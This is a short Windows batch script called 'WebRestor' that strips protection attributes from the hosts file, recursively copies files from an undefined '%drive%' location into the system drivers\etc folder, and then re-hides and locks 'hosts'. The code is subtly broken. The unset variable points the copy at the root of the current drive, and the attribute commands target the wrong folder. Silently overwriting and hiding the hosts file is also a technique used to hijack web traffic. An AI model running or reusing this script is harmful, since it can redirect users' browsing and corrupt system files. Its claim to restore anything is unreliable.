@echo off

title WebRestor Vr. %random%.%random%
color 0a
mode 70,10

attrib -h -s -r hosts
pause
xcopy /s /c /d /e /h /i /r /y "%drive%\*.*" "C:\Windows\System32\drivers\etc\*.*"
attrib +h +s +r hosts
exit
 